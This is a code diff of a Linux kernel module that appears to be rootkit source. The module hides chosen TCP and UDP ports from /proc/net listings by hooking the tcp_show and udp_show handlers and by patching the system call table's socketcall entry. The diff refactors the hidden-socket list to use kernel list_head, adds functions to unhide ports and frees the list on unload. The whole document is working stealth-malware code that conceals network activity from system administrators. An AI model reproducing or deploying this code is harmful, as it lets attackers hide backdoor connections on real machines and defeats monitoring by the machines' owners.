@@ -26,20 +26,18 @@ fun_long_int_unsigned_long orig_socketcall;
 struct l_socket_to_hide {
     int port;
     int prot;
-    struct l_socket_to_hide* next;
+    struct list_head list;
 };
 
-struct l_socket_to_hide* sockets_to_hide = 0;
+struct list_head sockets_to_hide;
 
 int port_to_hide = -1;
 char* prot_to_hide = "";
 
 void hide_socket(char *protocol, int port){
-    struct l_socket_to_hide* cur;
     struct l_socket_to_hide* toHide;
     toHide = kmalloc(sizeof(struct l_socket_to_hide), GFP_KERNEL);  
     // fill struct with protocoll and port
-    toHide->next = 0;
     toHide->port = port;
     if (strcmp (protocol, "udp") == 0){
         toHide->prot = OUR_PROT_UDP;
@@ -48,10 +46,22 @@ void hide_socket(char *protocol, int port){
         toHide->prot = OUR_PROT_TCP;
     }
     // add the new socket to hide to the sockets to be hidden
-    toHide->next = sockets_to_hide;
-    sockets_to_hide = toHide;
-    for(cur = sockets_to_hide; cur != 0; cur = cur->next){
+    list_add(&toHide->list, &sockets_to_hide);
+    /* list_for_each(cur, &sockets_to_hide){
         OUR_DEBUG("Hidden socket: %d on port %d\n", cur->prot, cur->port);
+    } */
+}
+
+void unhidesocket(int prot, int port){
+    struct list_head* cur;
+    struct list_head* cur2;
+    struct l_socket_to_hide* socket;
+    list_for_each_safe(cur, cur2, &sockets_to_hide){
+        socket = list_entry(cur, struct l_socket_to_hide, list);
+        if (socket->port == port && socket->prot == prot){
+            list_del(cur);
+            kfree(socket);
+        }
     }
 }
 
@@ -63,15 +73,20 @@ void hideUDP(int port){
     hide_socket("udp", port);
 }
 
-void unhide_socket(void){
-    hide_socket("", -1);
+void unhideTCP(int port){
+    unhidesocket(OUR_PROT_TCP, port);
+}
+
+void unhideUDP(int port){
+    unhidesocket(OUR_PROT_UDP, port);
 }
 
 static int hooked_udp_show(struct seq_file* file, void* v){
     int port;
     struct sock* sk;
     struct inet_sock* s;
-    struct l_socket_to_hide* cur;
+    struct l_socket_to_hide* socket;
+    struct list_head* cur;
     // if (strcmp(prot_to_hide, "udp")){
     //     return udp_show_orig(file, v);
     // }
@@ -83,11 +98,9 @@ static int hooked_udp_show(struct seq_file* file, void* v){
     OUR_DEBUG("pointer : %p\n", s);
     port = ntohs(s->sport);
     OUR_DEBUG("udp_show port: %d\n", s->sport);
-    if (sockets_to_hide == 0){
-        return udp_show_orig(file, v);
-    }
-    for(cur = sockets_to_hide; cur != 0; cur = cur->next){
-        if (port == cur->port && cur->prot == OUR_PROT_UDP){
+    list_for_each(cur, &sockets_to_hide){
+        socket = list_entry(cur, struct l_socket_to_hide, list);
+        if (port == socket->port && socket->prot == OUR_PROT_UDP){
             return 0;
         } 
     }
@@ -98,7 +111,8 @@ static int hooked_tcp_show(struct seq_file* file, void* v){
     int port;
     struct sock* sk;
     struct inet_sock* s;    
-    struct l_socket_to_hide* cur;
+    struct l_socket_to_hide* socket;
+    struct list_head* cur;
     // if (strcmp(prot_to_hide, "tcp")){
     //     return tcp_show_orig(file, v);
     // }
@@ -110,13 +124,11 @@ static int hooked_tcp_show(struct seq_file* file, void* v){
     OUR_DEBUG("tcp pointer : %p\n", s);
     port = ntohs(s->sport);
     OUR_DEBUG("tcp pointer2: %p\n", s);
-    if (sockets_to_hide == 0){
-        return tcp_show_orig(file, v);
-    }
     OUR_DEBUG("tcp_show port: %d, %d\n", port, port_to_hide);
-    for(cur = sockets_to_hide; cur != 0; cur = cur->next){
+    list_for_each(cur, &sockets_to_hide){
+        socket = list_entry(cur, struct l_socket_to_hide, list);
         OUR_DEBUG("Current TCP port checked: %d against in list %p\n", port, cur);
-        if (port == cur->port && cur->prot == OUR_PROT_TCP){
+        if (port == socket->port && socket->prot == OUR_PROT_TCP){
             return 0;
         } 
     }
@@ -157,12 +169,16 @@ void load_sockethiding(void){
     make_page_writable((long unsigned int)ptr_sys_call_table);
     syscall_table[__NR_socketcall] = hooked_socketcall;
     make_page_readonly((long unsigned int)ptr_sys_call_table);
+    INIT_LIST_HEAD(&sockets_to_hide);
 }
 
 void unload_sockethiding(void){
     struct proc_dir_entry *p = init_net.proc_net->subdir;
     struct tcp_seq_afinfo *tcp_seq = 0;
     struct udp_seq_afinfo *udp_seq = 0;
+    struct l_socket_to_hide *socket;
+    struct list_head *pos;
+    struct list_head *pos2;
     void** syscall_table;
     int counter = 0;
     while (p && counter <2){
@@ -183,4 +199,10 @@ void unload_sockethiding(void){
     make_page_writable((long unsigned int)ptr_sys_call_table);
     syscall_table[__NR_socketcall] = orig_socketcall;
     make_page_readonly((long unsigned int)ptr_sys_call_table);
+
+    list_for_each_safe(pos, pos2, &sockets_to_hide){
+        socket = list_entry(pos, struct l_socket_to_hide, list);
+        list_del(pos);
+        kfree(socket);
+    }
 }
